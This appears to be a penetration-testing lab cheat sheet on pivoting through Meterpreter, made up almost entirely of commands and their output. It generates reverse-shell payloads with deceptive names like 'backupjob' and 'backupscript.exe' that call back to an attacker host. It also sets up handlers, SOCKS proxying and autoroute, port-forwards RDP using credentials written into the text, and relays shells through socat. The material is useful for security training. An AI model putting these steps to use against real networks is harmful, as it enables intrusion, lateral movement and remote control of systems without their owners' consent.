# Meterpreter Tunneling

Like SSH tunneling except all handled through the convenience of Meterpreter.

## Payload for Jump Host

```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

### Start multi hander

```bash
msf6 > use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp

run
```

### Transfer and execute

```bash
scp backupjob ubuntu@<ipAddressofTarget>:~/

# Jump host
./backupjob
```

### Ping sweep attached network

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# Bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

ICMP request may be blocked, in that case use meterpreters built in proxy.

## MSF's SOCKS Proxy

```bash
msf6 > use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a

run
[*] Auxiliary module running as background job 0.

## Confirm
jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

**Add line to /etc/proxychains.conf if needed**

### Create Routes with AutoRoute

Tell our socks_proxy module to route all the traffic via our Meterpreter session. Have Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

```bash
msf6 > use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

```bash
meterpreter > run autoroute -s 172.16.5.0/23
```

### Check route configuration

```bash
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
   
# Test proxy and routing
$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

## Port Forwarding

Enable a listener on our attack host and request Meterpreter to forward  all the packets received on this port via our Meterpreter session to a  remote host on the 172.16.5.0/23 network.

### Creating Local TCP Relay

Example to create a remote rdp connection

```bash
# Meterpreter
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Windows target through local host
$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123

# Check connections
$ netstat -antp
```

## Reverse Port Forwarding

Start a listener on a new port on our attack host for Windows and  request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.

### Reverse Port Forwarding Rules

```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

### Configuring & Starting multi/handler

```bash
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 

```

### Windows Payload

Create a reverse shell payload that will send a connection back to our Ubuntu server on `172.16.5.129`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that was configured.

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

### Establishing the Meterpreter session

```bash
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

## Socat Redirection

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It  acts as a redirector that can listen on one host and port and forward  that data to another IP address and port.

```bash
# Reverse shell listener <-- to attack host
webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Bind shell listener --> windows host
webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

